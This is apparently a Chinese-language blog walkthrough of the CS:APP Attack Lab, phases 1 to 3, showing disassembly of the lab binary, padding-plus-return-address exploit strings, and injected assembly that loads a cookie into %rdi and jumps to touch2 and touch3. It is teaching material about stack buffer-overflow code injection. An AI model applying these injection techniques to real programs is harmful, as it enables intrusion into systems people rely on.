<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = <span class="built_in">getbuf</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution<br>within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,<br>there is code for a function touch1 having the following C representation:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch!: You called touch1()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">validate</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement,<br>rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly<br>related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.<br>Some Advice:<br>• All the information you need to devise your exploit string for this level can be determined by exam-<br>ining a disassembled version of CTARGET. Use objdump -d to get this dissembled version.<br>• The idea is to position a byte representation of the starting address for touch1 so that the ret<br>instruction at the end of the code for getbuf will transfer control to touch1.<br>• Be careful about byte ordering.<br>• You might want to use GDB to step the program through the last few instructions of getbuf to make<br>sure it is doing the right thing.<br>• The placement of buf within the stack frame for getbuf depends on the value of compile-time<br>constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the<br>disassembled code to determine its position.</p>
<p>所以我们要把touch1的函数位置来覆盖getbuf的返回值以便执行touch1</p>
<p>先输入查看汇编代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -d ctarget &gt;ctarget.s</span><br></pre></td></tr></table></figure>

<p>Getbuf:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp;</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br></pre></td></tr></table></figure>

<p>Touch1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>0x28在十进制下2*16+8&#x3D;40个bytes,一个地址是8个bytes,所以我们想要在getbuf时跳转到touch1则需要缓冲区把原本的地址的位置(0x5561dca8)覆盖成0x004017c0,而那空余的四十个bytes想填啥填啥</p>
<p>即字节码为:(小端法,逆序存储)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure>

<p>保存该文件为sol1.txt,然后把这个字节码转化成string,通过hex2raw命令(可以查看pdf文档的附录A),然后可以通过-i进行重定向输入,则完成Phase_1</p>
<p>输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt;sol1.txt &gt;sol1r.txt</span><br><span class="line">gdb ctarget</span><br><span class="line">run -q -i sol1r.txt</span><br></pre></td></tr></table></figure>

<p>观察到以下信息则通关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220621.png" alt="image-20240302013522137"></p>
<h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h2><p>照例读一遍官方pdf文档:</p>
<p>Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function <strong>touch2</strong> having the following C representation:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">2</span>;<span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,however, you must make it appear to touch2 as if you have passed your cookie as its argument.<code>你的任务是让CTARGET执行touch2的代码，而不是返回测试。但是，在这种情况下，您必须使它看起来像touch2一样，就像您已将cookie作为其参数传递一样。</code></p>
<p>Some Advice:<br>• You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it.<code>您将希望以这样一种方式定位注入代码的地址的字节表示形式，即getbuf代码末尾的ret指令将控制权转移给它。</code><br>• Recall that the first argument to a function is passed in register %rdi.<code>回想一下，函数的第一个参数是在寄存器 % rdi中传递的。</code><br>• Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.<code>您注入的代码应将寄存器设置为您的cookie，然后使用ret指令将控制权转移到touch2中的第一个指令。</code><br>• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of control, even when you are not returning from a call.<code>不要尝试在漏洞利用代码中使用jmp或调用指令。这些指令的目的地地址的编码难以公式化。对所有控制权转移使用ret指令，即使您没有从呼叫中返回。</code><br>• See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequence<code>请参阅附录b中有关如何使用工具生成指令序列的字节级表示的讨论</code></p>
<p>touch2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>所以我要做的应该是把%rdi中的值变成cookie的值,这样在比较时便会通过.</p>
<p>知识扫盲:汇编语言中的ret指令是call指令的逆操作，它表示从子程序中返回到主程序。执行ret指令时，CPU会从堆栈中弹出上一个储存的PC值，并将其加载到PC寄存器中，程序就回到了主程序中继续执行。这时%rsp不会变化(如果没有其它命令的话)</p>
<p>需完成操作:</p>
<ul>
<li><p>将cookie(0x59b997fa中的值推送到%rdi中</p>
</li>
<li><p>将touch2的地址push到栈中</p>
</li>
<li><p>ret,取到touch2的地址</p>
</li>
</ul>
<p>根据以上操作写出汇编代码,保存该代码为t2.s文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>接下来我们要得到机器代码(编译再反汇编得到机器代码指令)</p>
<p>输入以下指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -c -Og t2.s</span><br><span class="line">objdump -d t2.o&gt;t2.txt</span><br></pre></td></tr></table></figure>

<p>可以得到汇编代码的机器指令:</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220772.png" alt="image-20240302014356466"></p>
<p>然后通过gdb挑选一个注入代码的位置,这里我们选择getbuf中的$rsp栈顶作为代码注入位置,通过gdb命令,打一个在getbuf的断点,探测到rsp的地址,即栈顶地址</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402291454240.png" alt="image-20240229135832513"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p $rsp=0x5561dc78</span><br></pre></td></tr></table></figure>

<p>这样我们就可以开始编我们的进攻序列,在缓冲区中存放进攻指令,覆盖的地址填原来的栈顶,即在0x5561dc78注入代码进行进攻</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220816.png" alt="image-20240302014950119"></p>
<p>覆盖的地址要依照小端法逆序,而机器指令不用逆序,中间填充字符,当然可以考虑换一个代码注入位置.编完后我们要用hex2raw来转换进攻字节以便于生成进攻字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt;sol2.txt&gt;sol2r.txt</span><br><span class="line">./ctarget -q -i sol2r.txt</span><br></pre></td></tr></table></figure>

<p>然后提交会得到以下结果,圆满过关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220855.png" alt="image-20240302014929043"></p>
<p>或者我们可以选择不在那里注入代码,我们选择在test的栈帧内注入代码,即在0x5561dca8段注入代码!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220891.png" alt="image-20240302015226085"></p>
<p>理论成立,实践开始!</p>
<p>圆满通关!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220929.png" alt="image-20240302015316019"></p>
<h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h2><p>看一下官方文档:</p>
<p>Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:</p>
<p>touch3 C &amp;&amp; Assembly Code:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">touch3</span><span class="params">(<span class="type">char</span> \*sval)</span></span>&#123;</span><br><span class="line">vlevel = <span class="number">3</span>; <span class="comment">/*Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">00000000004018f</span>a &lt;touch3&gt;:</span><br><span class="line">  <span class="number">4018f</span>a:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  <span class="number">4018f</span>b:	<span class="number">48</span> <span class="number">89</span> fb             	mov    %rdi,%rbx</span><br><span class="line">  <span class="number">4018f</span>e:	c7 <span class="number">05</span> d4 <span class="number">2b</span> <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> 	movl   $<span class="number">0x3</span>,<span class="number">0x202bd4</span>(%rip)        # <span class="number">6044</span>dc &lt;vlevel&gt;</span><br><span class="line">  <span class="number">401905</span>:	<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">401908</span>:	<span class="number">48</span> <span class="number">89</span> fe             	mov    %rdi,%rsi</span><br><span class="line">  <span class="number">40190b</span>:	<span class="number">8b</span> <span class="number">3</span>d d3 <span class="number">2b</span> <span class="number">20</span> <span class="number">00</span>    	mov    <span class="number">0x202bd3</span>(%rip),%edi        # <span class="number">6044e4</span> &lt;cookie&gt;</span><br><span class="line">  <span class="number">401911</span>:	e8 <span class="number">36</span> ff ff ff       	callq  <span class="number">40184</span>c &lt;hexmatch&gt;</span><br><span class="line">  <span class="number">401916</span>:	<span class="number">85</span> c0                	test   %eax,%eax</span><br><span class="line">  <span class="number">401918</span>:	<span class="number">74</span> <span class="number">23</span>                	je     <span class="number">40193</span>d &lt;touch3+<span class="number">0x43</span>&gt;</span><br><span class="line">  <span class="number">40191</span>a:	<span class="number">48</span> <span class="number">89</span> da             	mov    %rbx,%rdx</span><br><span class="line">  <span class="number">40191</span>d:	be <span class="number">38</span> <span class="number">31</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x403138</span>,%esi</span><br><span class="line">  <span class="number">401922</span>:	bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">  <span class="number">401927</span>:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">40192</span>c:	e8 bf f4 ff ff       	callq  <span class="number">400</span>df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  <span class="number">401931</span>:	bf <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x3</span>,%edi</span><br><span class="line">  <span class="number">401936</span>:	e8 <span class="number">52</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>c8d &lt;validate&gt;</span><br><span class="line">  <span class="number">40193b</span>:	eb <span class="number">21</span>                	jmp    <span class="number">40195</span>e &lt;touch3+<span class="number">0x64</span>&gt;</span><br><span class="line">  <span class="number">40193</span>d:	<span class="number">48</span> <span class="number">89</span> da             	mov    %rbx,%rdx</span><br><span class="line">  <span class="number">401940</span>:	be <span class="number">60</span> <span class="number">31</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x403160</span>,%esi</span><br><span class="line">  <span class="number">401945</span>:	bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">  <span class="number">40194</span>a:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">40194f</span>:	e8 <span class="number">9</span>c f4 ff ff       	callq  <span class="number">400</span>df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  <span class="number">401954</span>:	bf <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x3</span>,%edi</span><br><span class="line">  <span class="number">401959</span>:	e8 f1 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401</span>d4f &lt;fail&gt;</span><br><span class="line">  <span class="number">40195</span>e:	bf <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%edi</span><br><span class="line">  <span class="number">401963</span>:	e8 d8 f4 ff ff       	callq  <span class="number">400e40</span> &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>Hexmatch C &amp;&amp;Assembly Code</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span><span class="comment">//将字符串与无符号值的十六进制表示进行比较</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line"><span class="comment">/*Make position of check string unpredictable */</span><span class="comment">//使检查字符串的位置不可预测</span></span><br><span class="line"><span class="type">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);<span class="comment">//将val转为16进制存入s</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">000000000040184</span>c &lt;hexmatch&gt;:</span><br><span class="line">  <span class="number">40184</span>c:	<span class="number">41</span> <span class="number">54</span>                	push   %r12</span><br><span class="line">  <span class="number">40184</span>e:	<span class="number">55</span>                   	push   %rbp</span><br><span class="line">  <span class="number">40184f</span>:	<span class="number">53</span>                   	push   %rbx</span><br><span class="line">  <span class="number">401850</span>:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">80</span>          	add    $<span class="number">0xffffffffffffff80</span>,%rsp</span><br><span class="line">  <span class="number">401854</span>:	<span class="number">41</span> <span class="number">89</span> fc             	mov    %edi,%r12d</span><br><span class="line">  <span class="number">401857</span>:	<span class="number">48</span> <span class="number">89</span> f5             	mov    %rsi,%rbp</span><br><span class="line">  <span class="number">40185</span>a:	<span class="number">64</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	mov    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">401861</span>:	<span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">401863</span>:	<span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">78</span>       	mov    %rax,<span class="number">0x78</span>(%rsp)</span><br><span class="line">  <span class="number">401868</span>:	<span class="number">31</span> c0                	<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">  <span class="number">40186</span>a:	e8 <span class="number">41</span> f5 ff ff       	callq  <span class="number">400</span>db0 &lt;random@plt&gt;</span><br><span class="line">  <span class="number">40186f</span>:	<span class="number">48</span> <span class="number">89</span> c1             	mov    %rax,%rcx</span><br><span class="line">  <span class="number">401872</span>:	<span class="number">48</span> ba <span class="number">0b</span> d7 a3 <span class="number">70</span> <span class="number">3</span>d 	movabs $<span class="number">0xa3d70a3d70a3d70b</span>,%rdx</span><br><span class="line">  <span class="number">401879</span>:	<span class="number">0</span>a d7 a3 </span><br><span class="line">  <span class="number">40187</span>c:	<span class="number">48</span> f7 ea             	imul   %rdx</span><br><span class="line">  <span class="number">40187f</span>:	<span class="number">48</span> <span class="number">01</span> ca             	add    %rcx,%rdx</span><br><span class="line">  <span class="number">401882</span>:	<span class="number">48</span> c1 fa <span class="number">06</span>          	sar    $<span class="number">0x6</span>,%rdx</span><br><span class="line">  <span class="number">401886</span>:	<span class="number">48</span> <span class="number">89</span> c8             	mov    %rcx,%rax</span><br><span class="line">  <span class="number">401889</span>:	<span class="number">48</span> c1 f8 <span class="number">3f</span>          	sar    $<span class="number">0x3f</span>,%rax</span><br><span class="line">  <span class="number">40188</span>d:	<span class="number">48</span> <span class="number">29</span> c2             	sub    %rax,%rdx</span><br><span class="line">  <span class="number">401890</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">92</span>          	<span class="built_in">lea</span>    (%rdx,%rdx,<span class="number">4</span>),%rax</span><br><span class="line">  <span class="number">401894</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">04</span> <span class="number">80</span>          	<span class="built_in">lea</span>    (%rax,%rax,<span class="number">4</span>),%rax</span><br><span class="line">  <span class="number">401898</span>:	<span class="number">48</span> c1 e0 <span class="number">02</span>          	shl    $<span class="number">0x2</span>,%rax</span><br><span class="line">  <span class="number">40189</span>c:	<span class="number">48</span> <span class="number">29</span> c1             	sub    %rax,%rcx</span><br><span class="line">  <span class="number">40189f</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">1</span>c <span class="number">0</span><span class="function">c          	<span class="title">lea</span>    <span class="params">(%rsp,%rcx,<span class="number">1</span>)</span>,%rbx</span></span><br><span class="line"><span class="function">  4018a3:	<span class="number">45</span> <span class="number">89</span> e0             	mov    %r12d,%r8d</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>a6:	b9 e2 <span class="number">30</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4030e2</span>,%ecx</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>ab:	<span class="number">48</span> c7 c2 ff ff ff ff 	mov    $<span class="number">0xffffffffffffffff</span>,%rdx</span></span><br><span class="line"><span class="function">  <span class="number">4018b</span>2:	be <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%esi</span></span><br><span class="line"><span class="function">  <span class="number">4018b</span>7:	<span class="number">48</span> <span class="number">89</span> df             	mov    %rbx,%rdi</span></span><br><span class="line"><span class="function">  <span class="number">4018b</span>a:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span></span><br><span class="line"><span class="function">  <span class="number">4018b</span>f:	e8 ac f5 ff ff       	callq  <span class="number">400e70</span> &lt;__sprintf_chk@plt&gt;</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>c4:	ba <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x9</span>,%edx</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>c9:	<span class="number">48</span> <span class="number">89</span> de             	mov    %rbx,%rsi</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>cc:	<span class="number">48</span> <span class="number">89</span> ef             	mov    %rbp,%rdi</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>cf:	e8 cc f3 ff ff       	callq  <span class="number">400</span>ca0 &lt;strncmp@plt&gt;</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>d4:	<span class="number">85</span> c0                	test   %eax,%eax</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>d6:	<span class="number">0f</span> <span class="number">94</span> c0             	sete   %al</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>d9:	<span class="number">0f</span> b6 c0             	movzbl %al,%eax</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>dc:	<span class="number">48</span> <span class="number">8b</span> <span class="number">74</span> <span class="number">24</span> <span class="number">78</span>       	mov    <span class="number">0x78</span>(%rsp),%rsi</span></span><br><span class="line"><span class="function">  <span class="number">4018e1</span>:	<span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">34</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> 	xor    %fs:<span class="number">0x28</span>,%rsi</span></span><br><span class="line"><span class="function">  <span class="number">4018e8</span>:	<span class="number">00</span> <span class="number">00</span> </span></span><br><span class="line"><span class="function">  <span class="number">4018</span>ea:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">4018f</span>1 &lt;hexmatch+<span class="number">0xa5</span>&gt;</span></span><br><span class="line"><span class="function">  <span class="number">4018</span>ec:	e8 ef f3 ff ff       	callq  <span class="number">400</span>ce0 &lt;__stack_chk_fail@plt&gt;</span></span><br><span class="line"><span class="function">  <span class="number">4018f</span>1:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">80</span>          	sub    $<span class="number">0xffffffffffffff80</span>,%rsp</span></span><br><span class="line"><span class="function">  <span class="number">4018f</span>5:	<span class="number">5b</span>                   	pop    %rbx</span></span><br><span class="line"><span class="function">  <span class="number">4018f</span>6:	<span class="number">5</span>d                   	pop    %rbp</span></span><br><span class="line"><span class="function">  <span class="number">4018f</span>7:	<span class="number">41</span> <span class="number">5</span>c                	pop    %r12</span></span><br><span class="line"><span class="function">  <span class="number">4018f</span>9:	c3                   	retq   </span></span><br></pre></td></tr></table></figure>



<p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.<code>您必须使其显示为touch3，就像您已将cookie的字符串表示形式作为其参数一样。</code><br>Some Advice:<br>• You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”<code>您需要在进攻字符串中包含一个代表你cookie的字符串。该字符串应由八个十六进制数字 (从最高到最低有效排序) 组成，没有前导 “0x”。</code><br>• Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.<code>回想一下，字符串在C中表示为字节序列，后跟值为0的字节。在任何Linux机器上键入 “man ascii” 以查看所需字符的字节表示。</code><br>• Your injected code should set register %rdi to the address of this string.<code>注入的代码应将寄存器 % rdi设置为该字符串的地址。</code><br>• When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.<code> 当调用函数hexmatch和strncmp时，它们将数据推送到堆栈上，覆盖保存getbuf使用的缓冲区的内存部分。因此，您需要小心放置cookie的字符串表示形式。</code></p>
<p>解决问题逻辑如下:</p>
<p>我们要实现的功能是让cookie和sval相匹配的话,那么就能通关,sval存放于寄存器%rdi中,以16进制的方式存在,而比较函数中会将cookie转化为16进制,所以我们要将cookie转化为16进制然后写入到%rdi</p>
<p>在呼叫touch3之前我们要把char *sval的值(其指针指向sval这个地址的字串)存入%rdi中,而该地址应该存的是cookie转化为ascii码表示,同时要知道hexmatch一上来就要了110个byte,所以很有可能把缓冲区给重新分配.</p>
<p>为了防止存放的字符串被hexmatch和strncmp覆盖,不能再0x5561dc78-0x5561dca0者之间存放字串,而0x5561dc78是分配的最低位置,0x5561dca0是放置跳转地址的位置,所以我们把字串放在test的栈空间之中比如:0x5561dca8.</p>
<p>操作如下</p>
<ul>
<li>把cookie转换成ascii码,通过查表的方式把cookie挨个转成ascii码.\0–&gt;00</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00 #00是字符串结尾</span><br></pre></td></tr></table></figure>

<ul>
<li>将touch3地址压入栈中</li>
<li>将%rsp地址+8—&gt;到%rdi中(当然也可以写精确地址0x5561dca8)</li>
<li>retq</li>
</ul>
<p>构建以下命令,保存为t3.s文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push $0x004018fa</span><br><span class="line">lea 0x8(%rsp),%rdi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>然后用Phase_2的方法得到机器指令代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -c -Og t3.s</span><br><span class="line">objdump -d t3.o&gt;t3.txt</span><br></pre></td></tr></table></figure>

<p>会得到如下代码</p>
